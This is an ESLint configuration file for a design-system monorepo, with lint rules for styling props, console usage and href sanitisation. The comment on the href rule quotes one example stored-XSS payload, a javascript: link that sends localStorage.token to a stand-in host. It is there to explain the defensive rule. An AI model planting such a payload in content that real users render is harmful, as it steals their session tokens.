import js from '@eslint/js';
import tsPlugin from '@typescript-eslint/eslint-plugin';
import tsParser from '@typescript-eslint/parser';
import eslintConfigPrettier from 'eslint-config-prettier';
import prettierPlugin from 'eslint-plugin-prettier';
import simpleImportSortPlugin from 'eslint-plugin-simple-import-sort';

import prettierConfig from './.prettierrc.json' with { type: 'json' };

/**
 * CSS properties (in both camelCase and kebab-case spellings) that have a design-system
 * prop of the same meaning. Sourced from the DS prop layers in
 * `packages/design-system/utils/src/index.ts`.
 *
 * Properties with no DS equivalent — white-space, filter, clip-path, backdrop-filter,
 * mix-blend-mode, grid-template-*, object-fit — are deliberately absent: `styles` is the
 * correct tool for those.
 */
const DS_PROP_EQUIVALENTS = [
  'width',
  'height',
  'minWidth',
  'min-width',
  'maxWidth',
  'max-width',
  'minHeight',
  'min-height',
  'maxHeight',
  'max-height',
  'position',
  'top',
  'right',
  'bottom',
  'left',
  'zIndex',
  'z-index',
  'display',
  'overflow',
  'overflowX',
  'overflow-x',
  'overflowY',
  'overflow-y',
  'flex',
  'alignSelf',
  'align-self',
  'margin',
  'marginTop',
  'margin-top',
  'marginRight',
  'margin-right',
  'marginBottom',
  'margin-bottom',
  'marginLeft',
  'margin-left',
  'padding',
  'paddingTop',
  'padding-top',
  'paddingRight',
  'padding-right',
  'paddingBottom',
  'padding-bottom',
  'paddingLeft',
  'padding-left',
  'gap',
  'background',
  'backgroundColor',
  'background-color',
  'color',
  'opacity',
  'border',
  'borderColor',
  'border-color',
  'borderRadius',
  'border-radius',
  'boxShadow',
  'box-shadow',
  'cursor',
  'pointerEvents',
  'pointer-events',
  'transform',
  'transition',
  'fontSize',
  'font-size',
  'fontWeight',
  'font-weight',
  'lineHeight',
  'line-height',
  'letterSpacing',
  'letter-spacing',
  'textAlign',
  'text-align',
  'textDecoration',
  'text-decoration',
  'textTransform',
  'text-transform',
  'fontFamily',
  'font-family',
  'flexDirection',
  'flex-direction',
  'flexShrink',
  'flex-shrink',
  'whiteSpace',
  'white-space',
  'alignItems',
  'align-items',
  'justifyContent',
  'justify-content',
];

/** Elements that accept DS props: `we-*` primitives and the layout/composite components. */
const DS_ELEMENTS = '^(we-|Column$|Row$|Grid$|Card$)';

function dsPropSelectors() {
  const props = `^(${DS_PROP_EQUIVALENTS.join('|')})$`;
  const message =
    'This CSS property has a design-system prop — use it instead of the style/styles escape hatch ' +
    '(e.g. width="130px", maxHeight="250px"). Reserve styles for CSS with no DS equivalent.';
  // Object keys appear as identifiers (width) or string literals ('max-height').
  return ['key.name', 'key.value'].map((keyPath) => ({
    selector:
      `JSXOpeningElement[name.name=/${DS_ELEMENTS}/] > JSXAttribute[name.name=/^styles?$/] ` +
      `> JSXExpressionContainer > ObjectExpression > Property[${keyPath}=/${props}/]`,
    message,
  }));
}

/**
 * An `href` built from stored data, with nothing between it and the DOM.
 *
 * ## The class this catches
 *
 * `href="javascript:fetch('//x/'+localStorage.token)"` is script execution in the app's own origin,
 * one click away, from anybody who can write a string anywhere it is rendered — a post body, a
 * profile field, a space description. `safeHref` was written for exactly that in #118 and applied
 * to `we-link` and `we-button`; the content layer then added a *third* renderer of a stored href —
 * the ProseMirror link mark's `toDOM`, which builds a live `<a>` from a mark a peer wrote — and it
 * went in raw. Two audits apart, the same class, in a renderer written after the fix.
 *
 * So the rule is about the shape rather than about the file: anything setting an `href` from an
 * expression has to name `safeHref` in it. A literal is exempt — `href="/about"` cannot switch
 * protocol — and so is a call to `safeHref` itself, which is the point.
 *
 * Matches both spellings a renderer uses: a JSX attribute, and an object property in a `toDOM`-style
 * array. It cannot see through a variable, so a value laundered through one still gets past; that is
 * the limit of a syntactic rule, and it still closes the case that has now happened twice.
 */
function hrefSelectors() {
  const message =
    'An href built from data must go through safeHref (@we/design-utils) — a stored string can be ' +
    '`javascript:`, which is script in this origin. A literal path needs nothing.';
  /*
    Two primitives and the router are exempt, because they are where the check already happens.

    `we-link` and `we-button` run `safeHref` on their own `href` — that is what #118 built and why
    the vast majority of links in the app are safe without their call sites knowing. Requiring the
    caller to sanitise as well would be asking every consumer to distrust the primitive, which is
    the opposite of why the primitive has it. `Navigate` is `@solidjs/router`'s, and its `href` is a
    route path rather than a URL: it never reaches the DOM as one.
  */
  const SANITISING = '^(we-link|we-button|Navigate)$';
  return [
    {
      selector:
        `JSXOpeningElement:not([name.name=/${SANITISING}/]) > JSXAttribute[name.name="href"] ` +
        '> JSXExpressionContainer[expression.callee.name!="safeHref"] > :not(JSXEmptyExpression)',
      message,
    },
    /*
      A DOM spec — `['a', { href }, 0]` — which is the ProseMirror `toDOM` shape and the one that
      actually got past everything else. Narrow on purpose: a bare `href:` property matches a schema
      node's props, a mark's stored attrs and half a dozen already-sanitised locals, and a rule that
      fires on all of those is a rule people turn off. This fires where an `<a>` is being built.
    */
    {
      selector:
        'ArrayExpression[elements.0.value="a"] > ObjectExpression > ' +
        'Property[key.name="href"][value.callee.name!="safeHref"][value.type!="Literal"]',
      message,
    },
  ];
}

export default [
  {
    ignores: [
      '**/dist/**',
      '**/node_modules/**',
      '**/build/**',
      '**/old/**',
      '**/target/**',
      '**/dist-electron/**',
      // Machine-generated sources (e.g. packages/entities/src/generated/coreManifest.ts,
      // written by generateCoreManifest.mjs) — emitted JSON-style, not prettier-style.
      '**/src/generated/**',
      // Same, from we-seed.json via apps/we-electron/scripts/generate-seed-config.cjs. The
      // generator's output has never been prettier-clean; the copy in the tree was hand-fixed once
      // and stayed that way only because nothing regenerated it in the root build.
      'apps/we-electron/electron/seed-*',
      // The branch-aware ad4m build (scripts/build-with-ad4m-link.sh) and
      // its CI counterpart clone the matching ad4m branch into ./ad4m and
      // link it via pnpm.overrides.  ESLint must not walk into that
      // checkout — it's not WE source, and walking it OOMs the linter.
      'ad4m/**',
    ],
  },
  {
    name: 'common/recommended',
    plugins: { prettier: prettierPlugin },
    rules: { ...prettierPlugin.configs.recommended.rules, 'prettier/prettier': ['error', prettierConfig] },
  },
  {
    name: 'javascript/recommended',
    files: ['**/*.js', '**/*.jsx'],
    languageOptions: {
      globals: {
        // Node.js globals
        console: 'readonly',
        process: 'readonly',
        __dirname: 'readonly',
        __filename: 'readonly',
        Buffer: 'readonly',
        // Global in Node since 10 and in Electron's main process; it was simply missing.
        URL: 'readonly',
        URLSearchParams: 'readonly',
        module: 'readonly',
        require: 'readonly',
        setTimeout: 'readonly',
        setInterval: 'readonly',
        clearTimeout: 'readonly',
        clearInterval: 'readonly',
      },
    },
    plugins: { 'simple-import-sort': simpleImportSortPlugin },
    rules: {
      ...js.configs.recommended.rules,
      'simple-import-sort/imports': 'error',
    },
  },
  {
    name: 'typescript/recommended',
    files: ['**/*.ts', '**/*.tsx'],
    plugins: { '@typescript-eslint': tsPlugin, 'simple-import-sort': simpleImportSortPlugin },
    languageOptions: {
      parser: tsParser,
      parserOptions: {
        projectService: true,
        tsconfigRootDir: import.meta.dirname,
      },
    },
    rules: {
      ...tsPlugin.configs.recommended.rules,
      'simple-import-sort/imports': 'error',
      '@typescript-eslint/no-explicit-any': 'warn',
      // A leading underscore is the codebase's existing signal for "deliberately unused" —
      // destructuring a key purely to keep it out of a `...rest` spread, or a positional
      // parameter that exists only to reach a later one.
      '@typescript-eslint/no-unused-vars': [
        'error',
        { argsIgnorePattern: '^_', varsIgnorePattern: '^_', caughtErrorsIgnorePattern: '^_' },
      ],
    },
  },
  // Turn off any rules that conflict with prettier
  eslintConfigPrettier,
  {
    // Declaration merging (interface + class) is the approved pattern for
    // adding HasManyMethods types to Ad4mModel subclasses without triggering
    // Babel's declare-field ordering issues. The interface body is intentionally
    // empty — it inherits all members from HasManyMethods<Keys>.
    name: 'ad4m-entities/declaration-merging',
    files: ['**/backend-system/ad4m/src/entities/**/*.ts', '**/src/block-types/**/*.ts'],
    rules: {
      '@typescript-eslint/no-unsafe-declaration-merging': 'off',
      '@typescript-eslint/no-empty-object-type': 'off',
    },
  },
  {
    // Design-system props over the style/styles escape hatch.
    //
    // CLAUDE.md ("Using the Design System in TypeScript Components") says to use `styles`
    // only for CSS with no DS equivalent — but that only held while people remembered it,
    // and the editor panels drifted a long way. This makes the common half mechanical:
    // if a CSS property has a DS prop of the same meaning, writing it through style/styles
    // is an error.
    //
    // Scoped deliberately:
    //   - only elements that accept DS props (we-* primitives, Column/Row/Grid/Card).
    //     A raw <div style> has no DS prop to use instead, so it is out of scope.
    //   - only DS-consuming packages. @we/components and @we/widgets *implement* DS props
    //     and legitimately write raw CSS; the React playgrounds have no DS at all.
    name: 'design-system/prefer-ds-props',
    files: [
      'packages/app-shell/**/*.tsx',
      'packages/editor/**/*.tsx',
      'packages/block-system/**/*.tsx',
      'packages/schema-system/**/*.tsx',
    ],
    rules: {
      'no-restricted-syntax': ['error', ...dsPropSelectors()],
    },
  },
  {
    // Every package that renders. See `hrefSelectors` for what this is about and what it cannot see.
    name: 'we/href-through-safe-href',
    files: ['packages/**/src/**/*.ts', 'packages/**/src/**/*.tsx', 'apps/**/src/**/*.ts', 'apps/**/src/**/*.tsx'],
    ignores: ['**/*.test.ts', '**/*.test.tsx'],
    rules: {
      'no-restricted-syntax': ['error', ...hrefSelectors()],
    },
  },
  {
    /*
      `console.log` is a debugging statement that got committed.

      Twenty of them sat in library source across three audits, saying things like
      "DatasetStore: creating root dataset" to whoever happened to have devtools open — noise in a
      shipped app, and the reason a genuine warning is hard to see in it.

      Three are allowed, and the line is about audience rather than severity. `error` and `warn`
      report a problem — this codebase reports a swallowed failure through `console.error` beside a
      toast, and several docblocks name that as the contract. `info` is the deliberate, low-volume
      operational note: "this runtime does not report pass progress", "recovered after 3 failed
      sends" — things worth saying once to whoever is looking at a misbehaving deployment.

      `log` and `debug` are what a debugging session leaves behind. Twenty of them said
      "DatasetStore: creating root dataset" to anybody who happened to open devtools, which is the
      noise a real warning has to be found in.

      Scoped to library source. A CLI's whole output is `console.log` (`seed/cli.ts`, the context
      generator, the schema validator), a test may print, and a playground is not shipped.
    */
    name: 'we/no-console-log-in-library-source',
    files: ['packages/**/src/**/*.ts', 'packages/**/src/**/*.tsx'],
    ignores: [
      '**/*.test.ts',
      '**/*.test.tsx',
      '**/src/cli/**',
      '**/cli/src/**',
      '**/app-shell/src/seed/cli.ts',
      // A component whose entire purpose is to print when it re-renders.
      '**/RerenderLog/**',
      '**/ai-context/src/**',
      // Same shape as the context generator: it runs as a build step and reports what it emitted.
      '**/brand/src/**',
      // Its entire purpose is a console line, opt-in and off by default.
      '**/installConsoleTrace.ts',
    ],
    rules: {
      'no-console': ['error', { allow: ['warn', 'error', 'info'] }],
    },
  },
];
